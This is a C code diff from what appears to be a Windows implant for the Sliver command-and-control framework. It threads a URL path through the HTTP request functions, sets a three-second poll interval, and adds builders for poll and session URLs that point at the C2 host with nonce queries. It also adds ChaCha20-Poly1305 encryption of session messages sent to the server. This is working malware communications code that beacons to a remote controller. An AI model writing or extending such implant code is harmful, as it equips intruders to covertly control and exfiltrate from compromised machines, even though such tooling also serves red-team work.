@@ -429,6 +429,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
+	_In_ LPWSTR lpPath,
 	_In_ DWORD dwNumberOfAttemps
 )
 {
@@ -441,7 +442,10 @@ HINTERNET SendRequest
 	DWORD dwLastError = 0;
 	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
 
-	if (lstrlenA(pUri->lpPathWithQuery) > 0) {
+	if (lpPath != NULL) {
+		pPath = DuplicateStrW(lpPath, 0);
+	}
+	else if (lstrlenA(pUri->lpPathWithQuery) > 0) {
 		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
 	}
 
@@ -825,6 +829,7 @@ PHTTP_RESP SendHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ PHTTP_CLIENT pHttpClient,
+	_In_ LPWSTR lpPath,
 	_In_ HttpMethod Method,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
@@ -885,7 +890,7 @@ PHTTP_RESP SendHttpRequest
 		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
 	}
 
-	hRequest = SendRequest(pHttpClient, pHttpRequest, pHttpConfig->dwNumberOfAttemps);
+	hRequest = SendRequest(pHttpClient, pHttpRequest, lpPath, pHttpConfig->dwNumberOfAttemps);
 	if (hRequest == NULL) {
 		goto CLEANUP;
 	}
@@ -1007,6 +1012,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	pResult->dwMinNumOfSegments = 2;
 	pResult->dwMaxNumOfSegments = 4;
 	pResult->uEncoderNonce = uEncoderNonce;
+	pResult->dwPollInterval = 3;
 	pResult->UseStandardPort = TRUE;
 	pResult->lpHostName = DuplicateStrA(lpC2Url, 0);
 	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
@@ -1174,6 +1180,62 @@ LPSTR GenNonceQuery
 
 	return lpResult;
  }
+
+LPSTR CreatePollURL
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
+)
+{
+	LPSTR lpUrlPath = NULL;
+	LPSTR lpResult = NULL;
+	LPSTR lpNonce = NULL;
+
+	lpUrlPath = ParseSegmentsUrl(pClient, PollType);
+	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lstrcatA(lpResult, "/");
+	lstrcatA(lpResult, lpUrlPath);
+	lstrcatA(lpResult, "?x=");
+	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
+	lstrcatA(lpResult, lpNonce);
+CLEANUP:
+	if (lpNonce != NULL) {
+		FREE(lpNonce);
+	}
+
+	if (lpUrlPath != NULL) {
+		FREE(lpUrlPath);
+	}
+
+	return lpResult;
+}
+
+LPSTR CreateSessionURL
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
+)
+{
+	LPSTR lpUrlPath = NULL;
+	LPSTR lpResult = NULL;
+	LPSTR lpNonce = NULL;
+
+	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
+	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lstrcatA(lpResult, "/");
+	lstrcatA(lpResult, lpUrlPath);
+	lstrcatA(lpResult, "?x=");
+	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
+	lstrcatA(lpResult, lpNonce);
+CLEANUP:
+	if (lpNonce != NULL) {
+		FREE(lpNonce);
+	}
+
+	if (lpUrlPath != NULL) {
+		FREE(lpUrlPath);
+	}
+
+	return lpResult;
+}
 
 LPSTR StartSessionURL
 (
@@ -1385,6 +1447,26 @@ CLEANUP:
 	return pResult;
 }
 
+PBYTE SessionEncrypt
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient,
+	_In_ PBYTE pMessage,
+	_In_ DWORD cbMessage,
+	_Out_ PDWORD pcbCipherText
+)
+{
+	PBYTE pNonce = NULL;
+	PBYTE pResult = NULL;
+
+	pNonce = GenRandomBytes(CHACHA20_NONCE_SIZE);
+	Chacha20Poly1305Encrypt(pClient->pSessionKey, pNonce, pMessage, cbMessage, NULL, 0, &pResult, pcbCipherText);
+	if (pNonce != NULL) {
+		FREE(pNonce);
+	}
+
+	return pResult;
+}
+
 PSLIVER_HTTP_CLIENT SliverSessionInit
 (
 	_In_ LPSTR lpC2Url
@@ -1438,7 +1520,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	}
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
